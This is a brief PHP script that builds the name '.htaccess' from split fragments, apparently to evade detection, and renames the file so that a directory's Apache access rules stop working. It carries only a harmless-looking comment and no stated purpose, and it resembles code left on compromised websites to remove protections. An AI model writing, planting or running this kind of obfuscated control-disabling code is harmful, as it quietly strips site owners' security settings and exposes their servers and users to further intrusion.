<?php
	// check if htaccess exists
	$f1 =".ht"; $f2 ="acc"; $f3 ="ess";
	$ff = $f1.$f2.$f3;
	if (file_exists($ff)) {
		# code...
		echo ".ht exists";
		rename(".htaccess", ".bad#htaccess");
	}

	//
?>